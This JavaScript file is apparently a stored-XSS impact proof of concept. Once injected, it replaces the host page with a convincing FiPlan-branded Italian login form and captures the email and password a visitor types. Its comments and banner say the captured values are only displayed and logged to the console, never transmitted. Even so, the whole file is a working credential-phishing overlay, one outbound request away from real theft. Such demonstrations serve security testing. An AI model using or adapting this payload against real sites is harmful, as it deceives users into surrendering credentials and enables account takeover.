// fiplan-login.js — XSS impact demonstration: rewrites the page into a FiPlan-branded sign-in form.
// Credentials entered are shown on the page and logged to the console only; nothing is transmitted.
(function () {
  "use strict";

  const css = `
    html, body { margin: 0; padding: 0; height: 100%; }
    #fp-shell { position: fixed; inset: 0; z-index: 2147483647; display: flex; align-items: center;
      justify-content: center; background: linear-gradient(160deg, #0d2b4e 0%, #16436f 55%, #1d5c94 100%);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    #fp-card { width: 360px; max-width: calc(100% - 40px); background: #fff; border-radius: 10px;
      box-shadow: 0 18px 48px rgba(0,0,0,.35); padding: 34px 32px 26px; }
    #fp-brand { font-size: 26px; font-weight: 700; letter-spacing: -.5px; color: #12456f; margin: 0 0 2px; }
    #fp-brand span { color: #2f86c9; }
    #fp-sub { font-size: 13px; color: #6b7a89; margin: 0 0 24px; }
    .fp-field { margin-bottom: 14px; }
    .fp-field label { display: block; font-size: 12px; color: #41505f; margin-bottom: 6px; }
    .fp-field input { width: 100%; box-sizing: border-box; height: 40px; padding: 0 12px; font-size: 14px;
      border: 1px solid #cfd8e1; border-radius: 6px; outline: none; }
    .fp-field input:focus { border-color: #2f86c9; box-shadow: 0 0 0 3px rgba(47,134,201,.15); }
    #fp-submit { width: 100%; height: 42px; margin-top: 6px; border: 0; border-radius: 6px; cursor: pointer;
      background: #2f86c9; color: #fff; font-size: 15px; font-weight: 600; }
    #fp-submit:hover { background: #2876b3; }
    #fp-alt { display: block; margin-top: 14px; font-size: 12px; color: #2f86c9; text-decoration: none; }
    #fp-caught { display: none; margin-top: 16px; padding: 10px 12px; border-radius: 6px; font-size: 12px;
      background: #fff4e5; border: 1px solid #f0c48a; color: #7a4a00; white-space: pre-wrap; }
    #fp-note { position: fixed; left: 0; right: 0; bottom: 0; padding: 6px 10px; text-align: center;
      font-size: 11px; color: rgba(255,255,255,.75); background: rgba(0,0,0,.25); }
  `;

  function build() {
    const shell = document.createElement("div");
    shell.id = "fp-shell";
    shell.innerHTML = `
      <div id="fp-card">
        <div id="fp-brand">Fi<span>Plan</span></div>
        <p id="fp-sub">Accedi al tuo spazio di lavoro</p>
        <form id="fp-form" autocomplete="off">
          <div class="fp-field">
            <label for="fp-user">Indirizzo e-mail</label>
            <input id="fp-user" name="user" type="email" placeholder="nome@azienda.it" required>
          </div>
          <div class="fp-field">
            <label for="fp-pass">Password</label>
            <input id="fp-pass" name="pass" type="password" placeholder="Password" required>
          </div>
          <button id="fp-submit" type="submit">Accedi</button>
          <a id="fp-alt" href="#">Password dimenticata?</a>
          <div id="fp-caught"></div>
        </form>
      </div>
      <div id="fp-note">PoC — this page runs from the stored XSS; nothing entered here is sent anywhere.</div>`;
    const style = document.createElement("style");
    style.textContent = css;
    document.head.appendChild(style);
    document.body.innerHTML = "";
    document.body.appendChild(shell);

    const form = shell.querySelector("#fp-form");
    const caught = shell.querySelector("#fp-caught");
    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      const user = shell.querySelector("#fp-user").value;
      const pass = shell.querySelector("#fp-pass").value;
      caught.style.display = "block";
      caught.textContent =
        "Captured in the victim's browser (not transmitted):\n" + user + " / " + pass;
      console.log("[fiplan-login PoC] captured", { user: user, pass: pass });
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", build, { once: true });
  } else {
    build();
  }
})();
